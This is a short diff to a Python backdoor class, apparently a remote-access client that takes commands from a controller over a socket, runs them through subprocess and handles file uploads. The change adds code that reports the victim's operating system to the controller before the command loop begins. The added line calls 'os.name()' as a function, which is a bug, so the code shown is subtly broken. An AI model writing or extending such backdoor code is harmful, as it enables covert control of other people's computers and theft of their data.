@@ -3,6 +3,7 @@ import socket
 import subprocess
 import json
 import base64
+import sys
 
 
 class Backdoor:
@@ -54,6 +55,9 @@ class Backdoor:
             return "[+] Upload successful"
 
     def run(self):
+        os_data = os.name()
+        self.reliable_send(os_data)
+
         while True:
             try:
                 command = self.reliable_receive()
